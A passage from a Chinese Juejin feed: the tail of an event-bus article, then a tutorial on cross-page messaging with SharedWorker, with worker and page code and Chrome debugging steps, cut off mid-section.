<p>这种方式有效地解耦了父子组件之间的直接依赖关系，提高了代码的可维护性和扩展性。在实际项目中，当存在多个组件之间复杂的交互时，事件总线是一种非常强大且灵活的解决方案。</p>
<hr/>
<blockquote>
<p>本次分享就到这儿啦，我是鹏多多，深耕前端的技术创作者，如果您看了觉得有帮助，欢迎评论，关注，点赞，转发，我们下次见~</p>
</blockquote>
<p>PS：在本页按F12，在console中输入document.getElementsByClassName('panel-btn')[0].click();有惊喜哦~</p>
<p><code>往期文章</code></p>
<ul>
<li><a href="https://juejin.cn/post/7582808491582619684" target="_blank" title="https://juejin.cn/post/7582808491582619684">Flutter输入框TextField的属性与实战用法全面解析+示例</a></li>
<li><a href="https://juejin.cn/post/7581693431740448831" target="_blank" title="https://juejin.cn/post/7581693431740448831">Flutter自定义日历table_calendar完全指南+案例</a></li>
<li><a href="https://juejin.cn/post/7580389111921786943" target="_blank" title="https://juejin.cn/post/7580389111921786943">flutter-屏幕自适应插件flutter_screenutil教程全指南</a></li>
<li><a href="https://juejin.cn/post/7579101504289882166" target="_blank" title="https://juejin.cn/post/7579101504289882166">flutter-使用url_launcher打开链接/应用/短信/邮件和评分跳转等</a></li>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutter图片选择库multi_image_picker_plus和image_picker的对比和使用解析</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">解锁flutter弹窗新姿势：dialog-flutter_smart_dialog插件解读+案例</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-切换状态显示不同组件10种实现方案全解析</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-详解控制组件显示的两种方式Offstage与Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-使用AnimatedDefaultTextStyle实现文本动画</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-使用SafeArea组件处理各机型的安全距离</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-实现渐变色边框背景以及渐变色文字</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-使用confetti制作炫酷纸屑爆炸粒子动画</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端跨页面通讯终极指南⑥：SharedWorker 用法全解析]]></title>    <link>https://juejin.cn/post/7583574154341072905</link>    <guid>https://juejin.cn/post/7583574154341072905</guid>    <pubDate>2025-12-14T19:52:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583574154341072905" data-draft-id="7576369868418875428" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端跨页面通讯终极指南⑥：SharedWorker 用法全解析"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-14T19:52:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一诺滚雪球"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端跨页面通讯终极指南⑥：SharedWorker 用法全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一诺滚雪球
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T19:52:22.000Z" title="Sun Dec 14 2025 19:52:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>前面的文章已经介绍了<code>postMessage</code>、<code>localStorage</code>、<code>messageChannel</code>、<code>broadcastChannel</code>以及<code>window.name</code>。今天要介绍一种“多页面协同”场景的工具——<strong>SharedWorker</strong>。</p>
<p>不同于普通Worker只能被单个页面独占，SharedWorker能被<strong>同一域名下的多个页面共享</strong>，实现高效的“多页面数据中枢”。本文就带你了解<strong>SharedWorker</strong>跨页面通讯的核心用法。</p>
<h2 data-id="heading-1">1. 什么是SharedWorker？</h2>
<p>在介绍SharedWorker之前，我们先回顾下Worker的基本概念：Worker是HTML5引入的后台线程机制，能让JavaScript在主线程之外运行，避免复杂计算阻塞页面渲染。而SharedWorker，顾名思义，是“可共享的Worker”，它有两个核心特点：</p>
<ul>
<li><strong>跨页面共享</strong>：同一域名下的多个标签页、iframe，甚至不同窗口，都能连接到同一个SharedWorker实例，实现数据互通。</li>
<li><strong>独立线程</strong>：运行在独立于所有页面主线程的后台线程中，既不会阻塞页面，也能统一处理多页面的请求。</li>
<li><strong>域名隔离</strong>：遵循同源策略，只有相同协议、域名、端口的页面，才能共享同一个SharedWorker。</li>
</ul>
<p>简单来说，SharedWorker就像一个“公共服务端”，多个页面作为“客户端”与之建立连接，通过它完成数据的传递与协同。和普通Worker的“一对一”模式不同，它是“一对多”的通讯方案。</p>
<h2 data-id="heading-2">2. SharedWorker如何实现跨页面通讯？</h2>
<p>SharedWorker的通讯原理可以概括为“<strong>单一实例+多端口连接</strong>”，先看一张图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5bdd1f7e0e489583b6c564474e5108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=IoaS0x0QCyt2r4a0Icakl8QznFo%3D" alt="image.png" loading="lazy"/></p>
<p>具体流程是：</p>
<ol>
<li><strong>创建实例</strong>：每个页面通过<code>new SharedWorker('./share.js')</code>创建实例时，浏览器会启动一个SharedWorker后台线程，加载指定的脚本文件,这个脚本文件是共享。</li>
<li><strong>端口建立</strong>：每个页面连接到SharedWorker后，都会与Worker建立一个独立的“消息端口”（MessagePort），这是页面与Worker之间的通讯通道。</li>
<li><strong>数据传递</strong>：页面和Worker都是通过通过端口发送消息<code>port.postMessage</code>，都是通过<code>port.onmessage</code>接收数据进行处理，再通过端口将结果反馈给单个页面，或广播给所有连接的页面。</li>
<li><strong>实例销毁</strong>：当所有连接到SharedWorker的页面都关闭时，Worker后台线程才会被浏览器销毁，释放资源。</li>
</ol>
<p>说了这么多,接下来我们进行实践操作。</p>
<h2 data-id="heading-3">3. 实践案例</h2>
<p>SharedWorker的使用分为“Worker脚本”和“页面脚本”两部分，Worker脚本负责核心逻辑，页面脚本负责建立连接和收发消息。</p>
<p>实现需求：同一域名下的pageA和pageB页面，通过SharedWorker实现消息互发，且任意页面可以通过Worker广播消息给所有页面。</p>
<p>可以先看一张页面如何连接到Worker流程图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c87f6c4b75dc4e1f8b9d2b93d6c3bf81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=2gdOw5PK2ryQkADfhfM2X1rmgH8%3D" alt="image.png" loading="lazy"/></p>
<p>页面端我们只需要接收发送消息即可，Worker端我们需要收集注册的端口并进行逻辑处理，下面我们一步步来实现：</p>
<h3 data-id="heading-4">3.1 步骤1：编写SharedWorker核心脚本（share.js）</h3>
<p>share.js的核心逻辑：是使用Map结构，通过<code>connect</code>将所有连接Worker的页面进行收集端口，每个页面需要唯一的pageId用于后续私发消息。</p>
<p>页面发送数据分为三种，进入页面需要注册到share.js，发送广播消息，发送私信需要target页面的pageId。 数据如下：</p>

























<table><thead><tr><th>类型</th><th>用途</th><th>参数</th></tr></thead><tbody><tr><td><code>register</code></td><td>页面注册</td><td><code>pageId</code></td></tr><tr><td><code>broadcast</code></td><td>广播消息</td><td><code>pageId</code>, <code>data</code></td></tr><tr><td><code>private</code></td><td>点对点消息</td><td><code>pageId</code>, <code>target</code>, <code>data</code></td></tr></tbody></table>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 注册页面</span>
port.<span class="hljs-title function_">postMessage</span>({                                              
    <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,                                           
    <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>                                          
});                                                            
<span class="hljs-comment">// 发送广播                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,                                          
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hello everyone!'</span>                                     
});                                                             
<span class="hljs-comment">// 发送私信                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,                                            
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hi page-456!'</span>                                        
}); 
</code></pre>
<p>share.js脚本：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 存储所有页面与Worker的连接端口（使用 Map，key 是 pageId，value 是 port）</span>
<span class="hljs-keyword">const</span> connections = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'打印***self'</span>, self)
<span class="hljs-comment">// 监听新页面的连接请求</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-comment">// 获取当前页面的通讯端口</span>
    <span class="hljs-keyword">const</span> port = e.<span class="hljs-property">ports</span>[<span class="hljs-number">0</span>];

    <span class="hljs-comment">// 注意：此时还不知道 pageId，需要等待 register 消息</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`新页面尝试连接，等待注册...`</span>);

    <span class="hljs-comment">// 允许端口通讯</span>
    port.<span class="hljs-title function_">start</span>();

    <span class="hljs-comment">// 向页面发送连接成功消息（用于调试）</span>
    port.<span class="hljs-title function_">postMessage</span>({
        <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>,
        <span class="hljs-attr">type</span>: <span class="hljs-string">'connected'</span>,
        <span class="hljs-attr">data</span>: <span class="hljs-string">`Worker 已连接，当前连接数：<span class="hljs-subst">${connections.size}</span>`</span>
    });

    <span class="hljs-comment">// 监听端口的消息事件（接收页面发来的消息）</span>
    port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Worker收到消息:'</span>, msg.<span class="hljs-property">data</span>);
        <span class="hljs-keyword">const</span> { type, target, data, pageId } = msg.<span class="hljs-property">data</span>;

        <span class="hljs-comment">// 0. 处理注册消息（页面连接时立即发送）</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'register'</span>) {
            <span class="hljs-comment">// 如果该 pageId 已存在，说明是页面刷新，先关闭旧连接</span>
            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(pageId)) {
                <span class="hljs-keyword">const</span> oldPort = connections.<span class="hljs-title function_">get</span>(pageId);
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 刷新，清理旧连接`</span>);
                <span class="hljs-keyword">try</span> {
                    oldPort.<span class="hljs-title function_">close</span>();
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-comment">// 忽略关闭错误</span>
                }
            }

            <span class="hljs-comment">// 保存新连接</span>
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 已注册，当前在线：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>,connections);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 保存页面标识到端口对象（兼容旧的发送方式）</span>
        <span class="hljs-keyword">if</span> (pageId &amp;&amp; !port.<span class="hljs-property">pageId</span>) {
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${pageId}</span> 已注册（兼容模式）`</span>);
        }

        <span class="hljs-comment">// 1. 广播消息：发送给所有连接的页面</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'broadcast'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`广播消息给 <span class="hljs-subst">${connections.size}</span> 个连接`</span>);
            connections.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">conn, id</span>) =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    conn.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`广播消息：<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`发送给 <span class="hljs-subst">${id}</span> 失败，移除连接`</span>);
                    connections.<span class="hljs-title function_">delete</span>(id);
                }
            });
        }
        <span class="hljs-comment">// 2. 点对点消息：仅发送给目标页面（这里用页面标识区分）</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'private'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`私发消息给 <span class="hljs-subst">${target}</span>，当前连接：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);

            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(target)) {
                <span class="hljs-keyword">try</span> {
                    connections.<span class="hljs-title function_">get</span>(target).<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`私发消息：<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`发送给 <span class="hljs-subst">${target}</span> 失败，移除连接`</span>);
                    connections.<span class="hljs-title function_">delete</span>(target);
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`警告：未找到目标页面 <span class="hljs-subst">${target}</span>`</span>);
            }
        }
    };

    <span class="hljs-comment">// 监听端口关闭事件（页面关闭或主动断开）</span>
    port.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'close'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// 通过 pageId 删除连接</span>
        <span class="hljs-keyword">if</span> (port.<span class="hljs-property">pageId</span>) {
            connections.<span class="hljs-title function_">delete</span>(port.<span class="hljs-property">pageId</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`页面 <span class="hljs-subst">${port.pageId}</span> 断开连接，当前在线：[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);
        }
    });

    <span class="hljs-comment">// 允许端口通讯（必须调用，否则无法收发消息）</span>
    port.<span class="hljs-title function_">start</span>();
});

</code></pre>
<h3 data-id="heading-5">3.2 步骤二：编写页面脚本（pageA.html 和 pageB.html）</h3>
<p>代码逻辑如下：唯一需要区别的是<code>pageId</code>，页面B只需将<code>pageId</code>改为<code>page-456</code>，并调整“发给页面B”按钮的逻辑为“发给页面A”即可。</p>
<p>页面的创建流程如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span> 页面创建 <span class="hljs-title class_">SharedWorker</span> 实例
   ↓
<span class="hljs-number">2.</span> 调用 port.<span class="hljs-title function_">start</span>() 启动通信
   ↓
<span class="hljs-number">3.</span> 注册 onmessage 监听器
   ↓
<span class="hljs-number">4.</span> 发送 register 消息（携带 pageId）
   ↓
<span class="hljs-number">5.</span> <span class="hljs-title class_">Worker</span> 保存连接到 <span class="hljs-title class_">Map</span>: connections.<span class="hljs-title function_">set</span>(pageId, port)
   ↓
<span class="hljs-number">6.</span> 页面可以开始发送/接收消息
</code></pre>
<p>代码如下：</p>
<pre><code class="hljs language-js" lang="js">&lt;body&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>页面A（标识：page-123）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"msgInput"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入消息"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendBroadcast()"</span>&gt;</span>广播消息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendToPageB()"</span>&gt;</span>发给页面B<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"log"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 页面唯一标识</span>
        <span class="hljs-keyword">const</span> pageId = <span class="hljs-string">'page-123'</span>;
        <span class="hljs-comment">// 1. 创建SharedWorker实例，指定Worker脚本路径</span>
        <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedWorker</span>(<span class="hljs-string">'./share.js'</span>);
        <span class="hljs-comment">// 2. 获取与Worker的通讯端口</span>
        <span class="hljs-keyword">const</span> port = worker.<span class="hljs-property">port</span>;

        <span class="hljs-comment">// 3. 允许端口通讯（必须在监听器之前调用）</span>
        port.<span class="hljs-title function_">start</span>();

        <span class="hljs-comment">// 4. 监听Worker发来的消息（使用onmessage更可靠）</span>
        port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'页面A收到消息:'</span>, msg.<span class="hljs-property">data</span>);
            <span class="hljs-keyword">const</span> log = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'log'</span>);
            log.<span class="hljs-property">innerHTML</span> += <span class="hljs-string">`&lt;p&gt;收到：<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(msg.data)}</span>&lt;/p&gt;`</span>;
        };

        <span class="hljs-comment">// 5. 连接成功后立即发送注册消息</span>
        port.<span class="hljs-title function_">postMessage</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,
            <span class="hljs-attr">pageId</span>: pageId
        });

        <span class="hljs-comment">// 发送广播消息</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendBroadcast</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// 发送点对点消息给页面B（页面B标识为page-456）</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendToPageB</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// 页面关闭时断开连接</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
            port.<span class="hljs-title function_">close</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-6">3.3 实际调试</h3>
<h4 data-id="heading-7">3.3.1 如何调试share.js</h4>
<p>通过Chrome如何查看share.js中打印的数据，页面是无法访问的，因为它是独立的控制台。</p>
<p>为什么控制台要独立？这是因为SharedWorker运行在与页面主线程完全隔离的独立线程中，从浏览器架构和安全设计出发，其控制台输出也需与页面线程分离，避免线程间的信息干扰。</p>
<p>打开步骤：</p>
<ol>
<li>在Chrome浏览器中直接访问地址：<code>chrome://inspect/#workers</code>；</li>
<li>页面会列出当前浏览器中所有运行的Worker实例，找到目标SharedWorker对应的“inspect”链接并点击，即可打开专属控制台。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0367fedb6578405488845baad6207d68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=670jd6YcO%2BHlhidyWmF42YmSoAI%3D" alt="image.png" loading="lazy"/></p>
<p>控制台打印：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55752a2673c6447f9641aeb5c2b200fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=GVYG7J6L97MBleOUS4skIH8LGrE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">3.3.2 页面发送广播或私发消息</h4>
<ol>
<li>将share.js、pageA.html、pageB.html部署到同一域名下（本地可用live-server启动）。</li>
